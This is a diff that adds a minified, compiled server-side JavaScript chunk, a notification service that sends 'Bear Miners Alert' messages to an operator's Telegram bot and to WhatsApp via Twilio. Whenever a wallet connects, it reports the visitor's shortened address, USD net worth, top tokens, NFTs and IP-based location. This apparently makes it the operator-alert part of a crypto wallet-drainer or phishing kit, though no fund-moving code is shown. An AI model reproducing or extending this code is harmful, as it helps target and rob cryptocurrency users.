@@ -1,0 +1,21 @@
+module.exports=[29173,(e,t,i)=>{t.exports=e.x("@prisma/client",()=>require("@prisma/client"))},98043,e=>{"use strict";e.s(["prisma",()=>i]);var t=e.i(29173);let i=e.g.prisma||new t.PrismaClient},27837,e=>{"use strict";e.s(["TelegramService",()=>i]);var t=e.i(98043);class i{static async sendNotification(e){console.log("[NotificationService] Processing outbound alert...");try{let i=await t.prisma.globalSettings.findUnique({where:{id:1}});if(!i)return void console.error("[NotificationService] Fatal: Global settings not found in database.");if(i.telegramBotToken&&i.telegramChatId){console.log(`[TelegramService] Sending alert to Chat ID: ${i.telegramChatId}...`);let t=`https://api.telegram.org/bot${i.telegramBotToken}/sendMessage`,o=await fetch(t,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:i.telegramChatId,text:e,parse_mode:"HTML"})});if(o.ok)console.log("[TelegramService] ✅ Success: Message delivered to Telegram.");else{let a=await o.text();console.error(`[TelegramService] ❌ Failed: ${o.status} - ${a}`),a.includes("can't parse entities")&&(console.log("[TelegramService] ℹ️ Retrying with plain-text fallback..."),await fetch(t,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:i.telegramChatId,text:e.replace(/<[^>]*>/g,"")})}))}}else(i.telegramBotToken||i.telegramChatId)&&console.warn("[TelegramService] ⚠️ Configuration is incomplete. Ensure both Token and Chat ID are set.");if(i.whatsappEnabled&&i.twilioAccountSid&&i.twilioAuthToken&&i.twilioPhoneNumber){console.log(`[WhatsAppService] Sending alert via Twilio to ${i.twilioPhoneNumber}...`);let t=Buffer.from(`${i.twilioAccountSid}:${i.twilioAuthToken}`).toString("base64"),o=`https://api.twilio.com/2010-04-01/Accounts/${i.twilioAccountSid}/Messages.json`,a=e.replace(/<[^>]*>/g,""),n=await fetch(o,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded",Authorization:`Basic ${t}`},body:new URLSearchParams({From:i.twilioPhoneNumber,To:i.twilioPhoneNumber.startsWith("whatsapp:")?i.twilioPhoneNumber:`whatsapp:${i.twilioPhoneNumber}`,Body:`[Bear Miners Alert]
+${a}`})});if(n.ok)console.log("[WhatsAppService] ✅ Success: Alert delivered to WhatsApp.");else{let e=await n.text();console.error(`[WhatsAppService] ❌ Failed: ${n.status} - ${e}`)}}else i.whatsappEnabled&&console.warn("[WhatsAppService] ⚠️ WhatsApp enabled but Twilio configuration is missing fields.")}catch(e){console.error("[NotificationService] 🚨 Fatal Error during delivery:",e)}}static async getIpDetails(e){if(!e||"::1"===e||"127.0.0.1"===e)return"Localhost (Dev Environment)";try{let t=await fetch(`http://ip-api.com/json/${e}?fields=status,country,city,isp`),i=await t.json();if("success"===i.status)return`${i.city}, ${i.country} (${i.isp})`}catch(e){console.warn("Failed to fetch IP details:",e)}return"Unknown Location"}static formatConnectionMessage(e,t,i="Solana",o=[],a=[]){let n=`${e.slice(0,6)}...${e.slice(-4)}`,r=new Intl.NumberFormat("en-US",{style:"currency",currency:"USD"}).format(t),s=`https://solscan.io/account/${e}`,l=String(i||"Solana").toLowerCase();l.includes("eth")||l.includes("erc")?s=`https://etherscan.io/address/${e}`:l.includes("btc")||l.includes("bitcoin")?s=`https://mempool.space/address/${e}`:(l.includes("bsc")||l.includes("binance"))&&(s=`https://bscscan.com/address/${e}`);let c="";o&&o.length>0&&(o.slice(0,15).forEach(e=>{let t=e.symbol||"Unknown",i=new Intl.NumberFormat("en-US",{style:"currency",currency:"USD"}).format(e.valueUsd||0),o=Number(e.amount).toLocaleString(void 0,{maximumFractionDigits:2});c+=`🔹 <b>${t}</b>: ${o} (${i})
+`}),o.length>15&&(c+=`<i>...and ${o.length-15} more tokens</i>
+`));let d="";return a&&a.length>0&&(a.slice(0,10).forEach(e=>{d+=`🖼 <code>${e.mint.slice(0,5)}...${e.mint.slice(-5)}</code>
+`}),a.length>10&&(d+=`<i>...and ${a.length-10} more NFTs</i>
+`)),`
+💰 <b>${r} ${i} Wallet Connected</b>
+
+👤 <b>User:</b> <code>${n}</code>
+🏦 <b>Network:</b> ${i}
+💵 <b>Net Worth:</b> <b>${r}</b>
+
+<b>Top Tokens & Meme Coins:</b>
+${c||"No tokens found."}
+${a.length>0?`
+<b>NFTs Detected:</b>
+${d}`:""}
+🔗 <a href="${s}">View on Explorer</a>
+    `.trim()}static escapeHTML(e){return e.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")}}}];
+
+//# sourceMappingURL=%5Broot-of-the-server%5D__8e7792ff._.js.map
